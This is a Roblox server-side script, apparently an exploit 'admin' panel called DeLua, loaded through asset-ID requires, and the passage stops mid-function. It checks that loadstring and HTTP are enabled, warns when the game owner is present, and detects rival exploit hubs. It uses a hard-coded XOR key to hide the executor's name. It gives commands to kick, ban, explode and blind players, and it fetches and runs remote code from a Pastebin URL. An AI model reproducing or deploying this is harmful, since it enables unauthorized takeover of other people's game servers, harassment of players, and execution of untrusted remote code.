--require(101692049849412):DeLua("crazyturkalxxs", "-", "Admin=true")

function saveData(str1, str2)
	local secret = "DeLua-&$vX9!r#Z*2^mP~Q3+uE)W=fB[4]{sC"
	local util = require(117351017999489)

	local service = game:GetService("ServerScriptService")
	local container = service:FindFirstChild("StorageFolder") or Instance.new("Folder", service)
	container.Name = "DeLua"

	local function doVal(key, val)
		local valObj = container:FindFirstChild(key)
		if not valObj then
			valObj = Instance.new("StringValue")
			valObj.Name = key
			valObj.Parent = container
		end

		local encryptedData = util.encrypt(val, secret)
		valObj.Value = util.toHex(encryptedData)
	end

	doVal("Data1", str1)
	doVal("Data2", str2)
end

saveData("Di33le3", "-")
--saveData("crazyturkalxxs", "-")

local EncryptedInitiate = {
	EncryptedExecutedBy = game.ServerScriptService.DeLua.Data1,
	EncryptedPrefix = game.ServerScriptService.DeLua.Data2,
}


local PrivateKey = "DeLua-&$vX9!r#Z*2^mP~Q3+uE)W=fB[4]{sC"
local Synabite = require(117351017999489)



local DeLuaFolder = game.ServerScriptService:FindFirstChild("DeLua")



function Synabite.Encrypt(Data)
	local PlainData = Data
	local EncryptedData = ""
	local keyLen = #PrivateKey
	for i = 1, #PlainData do
		local plainByte = string.byte(PlainData, i)
		local keyByte = string.byte(PrivateKey, ((i - 1) % keyLen) + 1)
		local encByte = bit32.bxor(plainByte, keyByte)
		EncryptedData = EncryptedData .. string.char(encByte)
	end
	return EncryptedData
end

function Synabite.Decrypt(Data)
	local EncryptedData = Data
	local DecryptedData = ""
	local keyLen = #PrivateKey
	for i = 1, #EncryptedData do
		local encByte = string.byte(EncryptedData, i)
		local keyByte = string.byte(PrivateKey, ((i - 1) % keyLen) + 1)
		local decByte = bit32.bxor(encByte, keyByte)
		DecryptedData = DecryptedData .. string.char(decByte)
	end
	return DecryptedData
end

function Synabite.ToHex(str)
	local result = ""
	for i = 1, #str do
		result = result .. string.format("%02x", string.byte(str, i))
	end
	return result
end

function Synabite.FromHex(hex)
	local result = ""
	for i = 1, #hex, 2 do
		local hexByte = hex:sub(i, i + 1)
		result = result .. string.char(tonumber(hexByte, 16))
	end
	return result
end

--[[ This Would Be Encrypted Before Runing this ServerScript with the require, although currently not, due to there being no require just yet.
local encrypted1 = Synabite.Encrypt("crazyturkalxxs")
local encryptedHex1 = Synabite.ToHex(encrypted1)
game.ServerScriptService.DeLua.Data1.Value = encryptedHex1
print("Encrypted (hex): " .. encryptedHex1)

local encrypted2 = Synabite.Encrypt("-")
local encryptedHex2 = Synabite.ToHex(encrypted2)
game.ServerScriptService.DeLua.Data2.Value = encryptedHex2
print("Encrypted (hex): " .. encryptedHex2)
--]]

task.wait(3)

--print(game.ServerScriptService.DeLua.Data1.Value)
--print(game.ServerScriptService.DeLua.Data2.Value)


local DecryptedData1 = Synabite.Decrypt(Synabite.FromHex(game.ServerScriptService.DeLua.Data1.Value))
--print("Decrypted: " .. DecryptedData1)

local DecryptedData2 = Synabite.Decrypt(Synabite.FromHex(game.ServerScriptService.DeLua.Data2.Value))
--print("Decrypted: " .. DecryptedData2)





local Initiate = {
	ExecutedBy = DecryptedData1,
	Prefix = DecryptedData2,
	VisualizerRan = false
}
Initiate.User = game.Players:FindFirstChild(Initiate.ExecutedBy)




-- Requiring
local NotificationLibrary = require(122366319601979)


-- Setting Up Core

NotificationLibrary.CONFIG = {
	ANIMATION_SPEED = 0.3,
	DEFAULT_DURATION = 5,
	CORNER_RADIUS = UDim.new(0, 8),
	THEME = {
		DARK = Color3.fromRGB(225, 225, 225),
		TEXT_PRIMARY = Color3.fromRGB(34, 34, 34),
		TEXT_SECONDARY = Color3.fromRGB(22, 22, 22),
		SUCCESS = Color3.fromRGB(76, 175, 80),
		WARNING = Color3.fromRGB(255, 193, 7),
		ERROR = Color3.fromRGB(244, 67, 54),
		INFO = Color3.fromRGB(33, 150, 243),
	},
	BUTTON_HOVER_TWEEN = {
		SCALE = Vector3.new(1.05, 1.05, 1.05),
		DURATION = 0.15,
	},
	BUTTON_CLICK_TWEEN = {
		SCALE = Vector3.new(0.95, 0.95, 0.95),
		DURATION = 0.1,
	},
	PULSE_EFFECT = {
		MIN_TRANSPARENCY = 0.7,
		MAX_TRANSPARENCY = 1,
		DURATION = 1.5
	},
	TEXT_APPEAR_DELAY = 0.2,
	RIPPLE_EFFECT_DURATION = 0.6
}

function notif(plr, title, message, type, duration)
	coroutine.wrap(function()
		if not plr or not plr:FindFirstChild("PlayerGui") then
			return
		end
		--require(105306341303469).DizzySSAsset_2(plr, title, message, icon, Internals.Secrets.AssetPassword)

		local notificationType = type
		--[[
		Info
		Warning
		Error
		Success	
		]]

		NotificationLibrary:NotifyServer(plr, {
			Title = title,
			Text = message,
			Type = notificationType,
			Duration = 5 or duration
		})
	end)()
end




local function EncryptV2(Data)
	local encrypted = Synabite.Encrypt(Data)
	return Synabite.ToHex(encrypted)
end

notif(Initiate.User, "DeLua", "Hello user, we are still setting up give us a second to verify some settings", "Info", 7)


local Console = Instance.new("ScreenGui", Initiate.User.PlayerGui)
Console.Name = EncryptV2("DeLuaConsole")

local ConsoleResponse = Instance.new("TextLabel", Console)
ConsoleResponse.Name = EncryptV2("Response")
ConsoleResponse.BackgroundTransparency = 1
ConsoleResponse.Size = UDim2.new(1, 0, 0, 25)
ConsoleResponse.Position = UDim2.new(0, 10, 1, -25)
ConsoleResponse.Text = ""
ConsoleResponse.TextXAlignment = "Left"


local function EditConsoleResponse(text, colour)
	ConsoleResponse.Text = text
	if colour == "Red" then
		ConsoleResponse.TextColor3 = Color3.fromRGB(255, 14, 58)
	elseif colour == "Yellow" then
		ConsoleResponse.TextColor3 = Color3.fromRGB(255, 240, 33)
	elseif colour == "Blue" then
		ConsoleResponse.TextColor3 = Color3.fromRGB(60, 187, 255)
	elseif colour == "Green" then
		ConsoleResponse.TextColor3 = Color3.fromRGB(24, 255, 59)
	elseif colour == "White" then
		ConsoleResponse.TextColor3 = Color3.fromRGB(186, 186, 186)
	end	
end	

EditConsoleResponse("Checking for potential issues", "Blue")
task.wait(0.3)

local HttpService = game:GetService("HttpService")
local DataStoreService = game:GetService("DataStoreService")
local MessagingService = game:GetService("MessagingService")
local players = game:GetService("Players"):GetPlayers()


-- Check 1: loadstring availability
local success, result = pcall(function()
	return loadstring("return true")()
end)

if success and result == true then
	EditConsoleResponse("LoadString Enabled ✅", "Green")
else
	EditConsoleResponse("LoadString Disabled or Blocked ❌", "Red")
	notif(Initiate.User, "Error", "DeLua can NOT run with LoadString Disabled, this is required for internal functions.", "Error", 10)
	return
end

task.wait(0.1)

-- Check 2: HttpService.HttpEnabled
if HttpService.HttpEnabled then
	EditConsoleResponse("HttpService Enabled ✅", "Green")
else
	EditConsoleResponse("HttpService Disabled ❌", "Red")
	notif(Initiate.User, "Error", "DeLua can NOT run with HttpService Disabled, this is required for internal functions.", "Error", 10)
	return
end

task.wait(0.1)

-- Check 3: MessagingService Accessibility
local msSuccess = pcall(function()
	MessagingService:PublishAsync("DeLuaTestChannel", "Test")
end)

if msSuccess then
	EditConsoleResponse("MessagingService Operational ✅", "Green")
else
	EditConsoleResponse("MessagingService Issue Detected ⚠️ This could affect commands", "Yellow")
end

task.wait(0.1)

EditConsoleResponse("All essential system checks complete ✅", "Green")

task.wait(0.4)

local ownerId = game.CreatorId

for _, player in ipairs(game.Players:GetPlayers()) do
	if player.UserId == ownerId then
		EditConsoleResponse("Game Owner is Present in the Server ⚠️", "Yellow")
		break
	end
end

task.wait(.4)


EditConsoleResponse("Checking for potential conflicts", "Blue")

task.wait(.2)
-- Check 1: Checking for Exser V2 Conflicts
EditConsoleResponse("Checking for Exser v2", "Blue")


local FoundExsers = 0

for _, player in ipairs(game.Players:GetPlayers()) do
	local playerGui = player:FindFirstChildOfClass("PlayerGui")
	if playerGui then
		local foundDebug = false
		for _, gui in ipairs(playerGui:GetChildren()) do
			if gui:IsA("ScreenGui") then
				if gui:FindFirstChild("DebugMode") then
					EditConsoleResponse(player.Name .. " has Exser ⚠️", "Yellow")
					FoundExsers = FoundExsers+1

				end
			end
		end
		if not foundDebug then
			EditConsoleResponse(player.Name .. " Does not have Exser", "White")
		end
	end
end

task.wait(0.2)
if FoundExsers > 0 then
	EditConsoleResponse("Found Exsers. Ammount: "..FoundExsers.." ⚠️", "Yellow")
	task.wait(1)
else
	EditConsoleResponse("No Exsers Found", "White")
end

task.wait(.2)
-- Check 2: Checking for Sensation Hub Conflicts
EditConsoleResponse("Checking for Sensation Hub", "Blue")

local FoundSensationHubs = 0

for _, player in ipairs(game.Players:GetPlayers()) do
	local playerGui = player:FindFirstChildOfClass("PlayerGui")
	if playerGui then
		local foundDebug = false
		for _, gui in ipairs(playerGui:GetChildren()) do
			if gui:IsA("ScreenGui") then
				if gui:FindFirstChild("Highlights") then
					EditConsoleResponse(player.Name .. " has Sensation Hub ⚠️", "Yellow")
					FoundSensationHubs = FoundSensationHubs+1

				end
			end
		end
		if not foundDebug then
			EditConsoleResponse(player.Name .. " Does not have Exser", "White")
		end
	end
end

task.wait(0.2)
if FoundSensationHubs > 0 then
	EditConsoleResponse("Found Sensation Hubs. Ammount: "..FoundSensationHubs.." ⚠️", "Yellow")
	task.wait(1)
else
	EditConsoleResponse("No Sensation Hub Found", "White")
end
task.wait(0.2)


-- Summarised: Responds with Conflicts if found any


if FoundSensationHubs+FoundExsers == 0 then
	EditConsoleResponse("Summary: DeLua is Functional ✅, Found Conflicts: "..FoundSensationHubs+FoundExsers, "Green")
else
	EditConsoleResponse("Summary: DeLua is Functional ✅, Found Conflicts: "..FoundSensationHubs+FoundExsers.." ⚠️", "Yellow")
end

task.wait(1)

EditConsoleResponse("Quickly Setting up, Sorry for the wait", "Blue")
task.wait(1)



--// Player Finder
function p(a, me)
	local ps = game.Players:GetPlayers()
	local found = {}

	if a:lower() == "me" then
		found = {me}
	elseif a:lower() == "others" then
		for i, player in ipairs(ps) do
			if player ~= me then
				table.insert(found, player)
			end
		end
	elseif a:lower() == "all" then
		found = ps
	elseif a:lower() == "random" then
		if #ps > 0 then
			found = {ps[math.random(1, #ps)]}
		end
	else
		for i, player in ipairs(ps) do
			if player.Name:lower():sub(1, #a) == a:lower() or player.DisplayName:lower():sub(1, #a) == a:lower() then
				table.insert(found, player)
			end
		end
	end

	return found
end




local Internals = {
	Commands = {},
	Banned = {},
	Muted = {},
	Whitelisted = {}, -- [PlayerName] = 1 (semi) or 2 (full)
	--[[
	Lvl 1 = (Mod) - kick
	Lvl 2 = (Head Admin) - ban, hubs, dex
	Lvl 3 = (Owner) - Unload
	
	]]
	Serverlock = false
}

--// Add Command
local function addcmd(data)
	if Internals.Commands[data.Name] then return end
	if not data.Aliases then data.Aliases = {} end
	if data.TargetRequired == nil then data.TargetRequired = true end
	if not data.Permission then data.Permission = 1 end
	Internals.Commands[data.Name] = { Data = data }
end

local function hasPermission(player, required)
	if player.Name == Initiate.ExecutedBy then
		local testingLevel = Internals.Whitelisted[player.Name]
		if testingLevel ~= nil then
			return testingLevel >= required
		end
		return true
	end

	local level = Internals.Whitelisted[player.Name]
	if not level then return false end
	return level >= required
end

-- Internals.Whitelisted["crazyturkalxxs"] = 1 -- MOD


addcmd({ 
	Name = "kick", 
	Aliases = {"k"}, 
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments) 
		for i, plr in ipairs(targets) do 
			if plr ~= sender then -- Prevent kicking yourself 
				local kickMessage = arguments and 
					"DeLua\n\nYou have been kicked from the server.\n\nReason: " .. table.concat(arguments, " ") or 
					"DeLua\n\nYou have been kicked from the server."
				plr:Kick(kickMessage) 
			else 
				NotificationLibrary:ServerConfirm(plr, { 
					Title = "DeLua", 
					Text = "Are you sure you want to kick yourself?", 
					YesText = "Confirm", 
					NoText = "Cancel", 
					Duration = 5, 
					OnYes = function(player) 
						sender.Name:Kick("DeLua\n\nThank you for using DeLua") 
					end, 
					OnNo = function(player) 
						notif(player, "DeLua", "Self-Kick cancelled.", "Success") 
					end 
				}) 
			end 
		end 
	end 
}) 


addcmd({ 
	Name = "delete", 
	Aliases = {"d"}, 
	Permission = 1,
	Function = function(sender, targets, arguments) 
		for _, plr in ipairs(targets) do 
			plr:Destroy() 
		end 
	end 
}) 

addcmd({ 
	Name = "shutdown", 
	Aliases = {"shutd"}, 
	Permission = 2,
	TargetRequired = false,
	Function = function(sender, targets, arguments) 
		NotificationLibrary:ServerConfirm(sender, { 
			Title = "DeLua", 
			Text = "Are you sure you want to shutdown the server?", 
			YesText = "Confirm", 
			NoText = "Cancel", 
			Duration = 5, 
			OnYes = function(player) 
				for _, v in pairs(game.Players:GetChildren()) do
					local shutdownMessage = arguments and 
						"DeLua\n\nServer has been shutdown.\n\nReason: " .. table.concat(arguments, " ") or 
						"DeLua\n\nServer has been shutdown."
					v:Kick(shutdownMessage) 
				end
			end, 
			OnNo = function(player) 
				notif(player, "DeLua", "Shutdown cancelled.", "Success") 
			end 
		})  
	end 
}) 

addcmd({ 
	Name = "unload", 
	Aliases = {}, 
	Permission = 3, -- OWNER ONLY
	Function = function(sender, targets, arguments) 
		NotificationLibrary:ServerConfirm(sender, { 
			Title = "DeLua", 
			Text = "Are you sure you want to Unload DeLua, you can NOT Reload it once removed", 
			YesText = "Yes", 
			NoText = "No", 
			Duration = 10, 
			OnYes = function(player) 
				notif(player, "DeLua", "Goodbye! Unloading now.", "Warning", 10) 
				script:Destroy() 
			end, 
			OnNo = function(player) 
				notif(player, "DeLua", "Unload cancelled.", "Success") 
			end 
		}) 
	end 
}) 

local function isBanned(userId)
	for _, banned in ipairs(Internals.Banned) do
		if banned.Id == userId then
			return true
		end
	end
	return false
end

local function getBanIndex(userId)
	for i, banned in ipairs(Internals.Banned) do
		if banned.Id == userId then
			return i
		end
	end
	return nil
end

game.Players.PlayerAdded:Connect(function(plr)
	if isBanned(plr.UserId) then
		plr:Kick("DeLua\n\nYou are permanently banned from this server.")
	end
end)

addcmd({
	Name = "ban",
	Aliases = {"b"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr ~= sender then
				if not isBanned(plr.UserId) then
					local reasonText = ""
					if arguments and #arguments > 0 then
						reasonText = "\n\nReason: " .. table.concat(arguments, " ")
					end

					table.insert(Internals.Banned, {
						Id = plr.UserId,
						Name = plr.Name,
						Description = reasonText
					})

					local banMessage = "DeLua\n\nYou have been permanently banned from this server." .. reasonText
					plr:Kick(banMessage)

					notif(sender.Name, "DeLua", plr.Name .. " has been banned.")
				else
					notif(sender.Name, "DeLua", plr.Name .. " is already banned.")
				end
			else
				notif(sender.Name, "You cannot ban yourself.", "Warning")
			end
		end
	end
})

addcmd({
	Name = "unban",
	Aliases = {"ub"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			local index = getBanIndex(plr.UserId)
			if index then
				table.remove(Internals.Banned, index)
				notif(sender.Name, "DeLua", plr.Name .. " has been unbanned.")
			else
				notif(sender.Name, "DeLua", plr.Name .. " is not banned.")
			end
		end
	end
})

addcmd({
	Name = "bans",
	Aliases = {"banslist", "banlist"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		local BanListUi = require(103931615114020) --103931615114020

		local uiInstance = BanListUi:Build(sender)

		wait(0.1)

		for _, banned in ipairs(Internals.Banned) do
			local reasonText = banned.Reason ~= "" and banned.Reason or "No reason provided"
			BanListUi:Create(sender, banned.Name, reasonText, banned.Id, function()

				local index = getBanIndex(banned.Id)
				if index then
					table.remove(Internals.Banned, index)
					notif(sender, "DeLua", banned.Name .. " has been unbanned via ban list.")
				else
					notif(sender, "DeLua", banned.Name .. " is not banned.")
				end
			end)
		end
	end
})

addcmd({
	Name = "serverlock",
	Aliases = {"slock"},
	Permission = 2,
	Function = function(sender, _, arguments)
		local args = table.concat(arguments, " ")
		Internals.Serverlock = not Internals.Serverlock

		notif(sender,"DeLua", "Server Locked = "..tostring(Internals.Serverlock), "Warning", 10)
	end
})

addcmd({
	Name = "punish",
	Aliases = {},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			plr.Character:Destroy()
		end
	end
})

addcmd({
	Name = "explode",
	Aliases = {},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			local explosion = Instance.new("Explosion", workspace)
			explosion.Position = plr.Character.PrimaryPart.Position
		end
	end
})

addcmd({
	Name = "freeze",
	Aliases = {"frz"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character then
				for _, part in ipairs(plr.Character:GetDescendants()) do
					if part:IsA("BasePart") then
						part.Anchored = true
					end
				end
			end
		end
	end
})

addcmd({
	Name = "unfreeze",
	Aliases = {"unfrz"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character then
				for _, part in ipairs(plr.Character:GetDescendants()) do
					if part:IsA("BasePart") then
						part.Anchored = false
					end
				end
			end
		end
	end
})

addcmd({
	Name = "fling",
	Aliases = {"throw"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.Velocity = Vector3.new(0, 150, 0)
			end
		end
	end
})

addcmd({
	Name = "burn",
	Aliases = {"fire"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character then
				for _, part in ipairs(plr.Character:GetDescendants()) do
					if part:IsA("BasePart") then
						local fire = Instance.new("Fire", part)
					end
				end
			end
		end
	end
})

addcmd({
	Name = "blind",
	Aliases = {"bld"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			local gui = Instance.new("ScreenGui", plr:FindFirstChildOfClass("PlayerGui"))
			gui.Name = "BlindEffect"
			local frame = Instance.new("Frame", gui)
			frame.Size = UDim2.new(1,0,1,0)
			frame.BackgroundColor3 = Color3.new(0,0,0)
		end
	end
})

addcmd({
	Name = "unblind",
	Aliases = {"ubld"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			local gui = plr:FindFirstChildOfClass("PlayerGui"):FindFirstChild("BlindEffect")
			if gui then
				gui:Destroy()
			end
		end
	end
})


-- Ragdoll
local function createRagdoll(character)
	local humanoid = character:FindFirstChild("Humanoid")
	if not humanoid then return end

	local jointData = {}

	for _, joint in ipairs(character:GetDescendants()) do
		if joint:IsA("Motor6D") then
			local attachment0 = Instance.new("Attachment")
			local attachment1 = Instance.new("Attachment")

			attachment0.CFrame = joint.C0
			attachment1.CFrame = joint.C1
			attachment0.Parent = joint.Part0
			attachment1.Parent = joint.Part1

			local ballSocket = Instance.new("BallSocketConstraint")
			ballSocket.Attachment0 = attachment0
			ballSocket.Attachment1 = attachment1
			ballSocket.LimitsEnabled = true
			ballSocket.TwistLimitsEnabled = true
			ballSocket.UpperAngle = 45
			ballSocket.TwistLowerAngle = -45
			ballSocket.TwistUpperAngle = 45
			ballSocket.Parent = character

			jointData[joint.Name] = {
				joint = joint,
				attachment0 = attachment0,
				attachment1 = attachment1,
				ballSocket = ballSocket
			}

			joint.Enabled = false
		end
	end

	humanoid.PlatformStand = true
	humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
	humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
	humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)

	character:SetAttribute("RagdollData", jointData)
	character:SetAttribute("IsRagdolled", true)
end

local function removeRagdoll(character)
	local humanoid = character:FindFirstChild("Humanoid")
	if not humanoid then return end

	for _, constraint in ipairs(character:GetChildren()) do
		if constraint:IsA("BallSocketConstraint") then
			constraint:Destroy()
		end
	end

	for _, joint in ipairs(character:GetDescendants()) do
		if joint:IsA("Motor6D") then
			joint.Enabled = true
		end
	end

	for _, part in ipairs(character:GetChildren()) do
		if part:IsA("BasePart") then
			for _, attachment in ipairs(part:GetChildren()) do
				if attachment:IsA("Attachment") and attachment.Name ~= "RootRigAttachment" then
					attachment:Destroy()
				end
			end
		end
	end

	humanoid.PlatformStand = false
	humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
	humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
	humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)

	character:SetAttribute("IsRagdolled", false)
end

addcmd({
	Name = "ragdoll",
	Aliases = {"rag"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Humanoid") then
				createRagdoll(plr.Character)
			end
		end
	end
})

addcmd({
	Name = "unragdoll",
	Aliases = {"unrag", "stand"},
	Permission = 1,
	TargetRequired = true,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Humanoid") then
				removeRagdoll(plr.Character)
			end
		end
	end
})

addcmd({
	Name = "rejoin",
	Aliases = {"rj", "rej"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if game.PrivateServerId ~= "" then
				game:GetService("TeleportService"):Teleport(game.PlaceId, plr)
			else
				local options = Instance.new("TeleportOptions")
				options.ServerInstanceId = game.JobId

				game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {plr}, options)
			end
		end
	end
})

addcmd({
	Name = "restart",
	Aliases = {"rs", "restartserver", "softshutdown"},
	Permission = 2,
	TargetRequired = false,
	Function = function(sender, targets, arguments)
		local players = game:GetService("Players"):GetPlayers()
		local TeleportService = game:GetService("TeleportService")

		NotificationLibrary:ServerConfirm(sender, {
			Title = "DeLua",
			Text = "Are you sure you want to Restart the server?",
			YesText = "Restart",
			NoText = "No",
			Duration = 10,
			OnYes = function(player)
				notif(player, "DeLua", "Goodbye! Restarting now.", "Warning", 10)

				local success, code = pcall(function()
					return TeleportService:ReserveServer(game.PlaceId)
				end)

				if success and code then
					for _, plr in ipairs(players) do
						notif(plr, "DeLua", "Restarting... sending you to holding server.", "Warning", 0)
					end

					task.wait(4)
					TeleportService:TeleportToPrivateServer(game.PlaceId, code, players)
					notif(sender, "DeLua", "Players sent to reserved server. You may now reload the main server.", "Info", 10)
				else
					notif(sender, "DeLua", "Failed to reserve server: " .. tostring(code), "Error", 10)
				end
			end,
			OnNo = function(player)
				notif(player, "DeLua", "Restart cancelled.", "Success")
			end
		})
	end
})

if game.PrivateServerId ~= "" and game.PrivateServerOwnerId == 0 then
	for _, plr in ipairs(game.Players:GetPlayers()) do
		notif(plr, "DeLua", "Sending you to the New Public Server", "Warning", 0)
	end
	task.wait(3)
	local players = game:GetService("Players"):GetPlayers()
	for _, plr in ipairs(players) do
		pcall(function()
			plr:LoadCharacter()
			game:GetService("TeleportService"):Teleport(game.PlaceId, plr, {
				softshutdowned = true,
				dizzy = true,
			})
		end)
	end
end




addcmd({
	Name = "re",
	Aliases = {"reset"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local rnpos = plr.Character.HumanoidRootPart.CFrame
				plr:LoadCharacter()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					plr.Character.HumanoidRootPart.CFrame = rnpos
				end
			else
				plr:LoadCharacter()
			end
		end
	end
})

addcmd({
	Name = "bring",
	Aliases = {"tome"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	end
})

addcmd({
	Name = "goto",
	Aliases = {"to"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 4.5)
			end
		end
	end
})


addcmd({
	Name = "cmds",
	Aliases = {"commands", "commandlist"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		local CommandsListUI = require(98606698996412)
		local uiInstance = CommandsListUI:Build(sender)

		wait(0.1)

		local sortedCommands = {}
		for cmdName, cmdData in pairs(Internals.Commands) do
			table.insert(sortedCommands, cmdName)
		end
		table.sort(sortedCommands)

		for _, cmdName in ipairs(sortedCommands) do
			local cmdData = Internals.Commands[cmdName]
			local aliases = cmdData.Data.Aliases or {}
			local permLevel = cmdData.Data.Permission or "N/A"

			CommandsListUI:Create(sender, cmdName .. " (Lvl " .. permLevel .. ")", table.concat(aliases, ", "))
		end
	end
})



local HubScripts = {
	{
		Name = "DIZZY Admin - Admin",
		Description = "A powerful admin built for Kohls Admin House Legacy: Require whitelist pfx = .",
		Function = function(sender)
			local success, fail = pcall(function()
				loadstring(game:GetService('HttpService'):GetAsync('https://pastebin.com/raw/DgUyYyE7'))()
			end)

			if fail then
				notif(sender, "DIZZY Admin", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Exser v2 Hub - UI",
		Description = "A powerful panel with built in hub, admin and executor. Very strong.",
		Function = function(sender)
			local success, fail = pcall(function()
				require(10868847330):pls(sender.Name)
			end)

			if success then
				task.spawn(function()
					task.wait(1)
					notif(sender, "Exser", "The hub password is c00lkidds", "Info", 10)
				end)
			else
				notif(sender, "Exser", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Punchside - Admin",
		Description = "Serverside admin with potential and fun scripts: Requires Whitelist pfx = -",
		Function = function(sender)
			notif(sender, "DeLua", "Loading PunchSide", "Info")

			local success, fail = pcall(function()
				require(115513593459588).LoadPunchside()
			end)

			if fail then
				notif(sender, "PunchSide", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Crucific - Tool",
		Description = "Fun way to kill players with a nice animation dragging them under the floor.",
		Function = function(sender)
			local success, fail = pcall(function()
				require(13948599266).crucifix(sender.Name)
			end)

			if fail then
				notif(sender, "Crucifix", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "RazvanJTL's Traveller - Script",
		Description = "Very cool script with stuff like Terrain draw ect: Weird controls though",
		Function = function(sender)
			notif(sender, "DeLua", "Loading RazvanJTL's Traveller", "Info")

			local success, fail = pcall(function()
				require(122089183898257)(sender.Name,"RazvanJTL's Traveller")
			end)

			if fail then
				notif(sender, "DeLua", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Sensation Hub - UI",
		Description = "Extremely powerful hub with plenty of scripts, might be backdooring stuff?",
		Function = function(sender)
			notif(sender, "DeLua", "Loading Sensation Hub", "Info")

			local success, fail = pcall(function()
				require(100263845596551)(sender.Name, ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")
			end)

			if success then
				task.spawn(function()
					task.wait(1)
					notif(sender, "Sensation Hub", "Loaded Sensation Hub.", "Info")
				end)
			else
				notif(sender, "Sensation Hub", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Citizen Hammer - Tool",
		Description = "A cool hammer that can shatter objects and people!",
		Function = function(sender)
			local success, fail = pcall(function()
				require(8038037940).CLoad(sender.Name)
			end)

			if fail then
				notif(sender, "Citizen Hammer", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Saitama (One Punch Man) - Script",
		Description = "Cool punchy dude",
		Function = function(sender)
			notif(sender, "DeLua", "Loading Saitama (One Punch Man)", "Info")

			local success, fail = pcall(function()
				require(14499140823)(sender.Name, "saitama2")
			end)

			if fail then
				notif(sender, "DeLua", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Gojo - Script",
		Description = "A lot of powers, it's mid in power",
		Function = function(sender)
			notif(sender, "DeLua", "Loading Gojo", "Info")

			local success, fail = pcall(function()
				require(103408394508146).unlimited(sender.Name)
			end)

			if fail then
				notif(sender, "DeLua", "Failed to load: ".. fail, "Error")
			end
		end
	},
	{
		Name = "Phantom Forces 2022 - Map",
		Description = "Fully working phantom forces map from 2022",
		Function = function(sender)
			notif(sender, "DeLua", "Loading Gojo", "Info")

			NotificationLibrary:ServerConfirm(sender, {
				Title = "DeLua",
				Text = "Are you sure? This will Destroy DeLua (2/2)",
				YesText = "Confirm",
				NoText = "Cancel",
				Duration = 5,
				OnYes = function(player)

					NotificationLibrary:ServerConfirm(sender, {
						Title = "DeLua",
						Text = "Are you positively sure? This will Destroy DeLua (1/2)",
						YesText = "Confirm",
						NoText = "Cancel",
						Duration = 5,
						OnYes = function(player)

							-- ACTUAL MAP LOAD HAPPENS HERE after both confirms
							local success, result = pcall(function()
								require(77505937852996)()
							end)

							if success then
								notif(player, "DeLua", "Map loaded successfully.", "Success")
							else
								notif(player, "DeLua", "Failed to load: " .. tostring(result), "Error")
							end

						end,
						OnNo = function(player)
							notif(player, "DeLua", "Map load cancelled.", "Success")
						end
					})

				end,
				OnNo = function(player)
					notif(player, "DeLua", "Map load cancelled.", "Success")
				end
			})
		end
	}



}

addcmd({
	Name = "hubs",
	Aliases = {"scripthub", "hublist", "hub"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		local HubListUi = require(114927073448970)
		local uiInstance = HubListUi:Build(sender)

		wait(0.1)

		for _, hub in ipairs(HubScripts) do
			HubListUi:Create(sender, hub.Name, hub.Description, function()
				hub.Function(sender)
			end)
